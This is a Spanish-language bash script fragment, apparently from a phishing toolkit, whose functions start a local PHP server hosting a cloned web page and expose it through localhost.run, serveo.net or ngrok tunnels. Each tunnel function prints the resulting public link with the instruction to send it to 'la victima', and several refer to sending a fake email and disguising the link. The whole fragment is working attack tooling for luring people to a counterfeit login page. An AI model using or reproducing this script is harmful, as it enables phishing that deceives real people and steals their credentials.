localrun(){
        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
        echo
        php -S localhost:3333 > /dev/null 2>&1 &
	if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f run ]];then
                rm run
        fi
        
        $(which sh) -c 'ssh -R 80:localhost:$port nokey@localhost.run 2> /dev/null > run ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo local.run..."
        sleep 5
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 5
        envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
        
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
                disfraz
                check
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check_found
        fi
        if [[ -f run ]]; then
                rm run
        fi
}


serveo(){
        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
	if [[ $clonada == "si" ]];then
                descargar_pagina
        fi
	echo
        php -S localhost:3333 > /dev/null 2>&1 & 
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f link ]]; then
                rm -rf link
        fi
        
        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo serveo..."
        sleep 5
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 5
        envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
                disfraz

        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check
                check_found
        fi
        if [[ -f link ]]; then
                rm -rf link
        fi
}

ngrok(){
	if [[ $clonada == "si" ]];then
		descargar_pagina
	fi
        echo
        php -S localhost:3333 > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        cd $OLDPWD
        findngrok
        ./ngrok http 3333 > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 7
        echo -e "$v[$b*$v]$b Abriendo ngrok..."
        sleep 7
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 7
        envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
		exit 1
        else
                echo -e "$v[$b*$v]$b $link"
                echo -e "$v[$b*$v]$b Envia a la victima: \e[0;32m$envialink"
                cd $ruta_carpeta
                disfraz
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
        check
        check_found
	fi
}


localhost(){

if [[ $clonada == "si" ]];then
		descargar_pagina
	fi
        echo -e "$v[$b*$v]$b Iniciando servidor php..."
        php -S localhost:3333 > /dev/null 2>&1 &
        cd $OLDPWD

        echo -e "$v[$b*$v]$b Tu enlace: \e[0;32mhttp://localhost:3333"
        cd $ruta_carpeta


        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
        check
        check_found

}


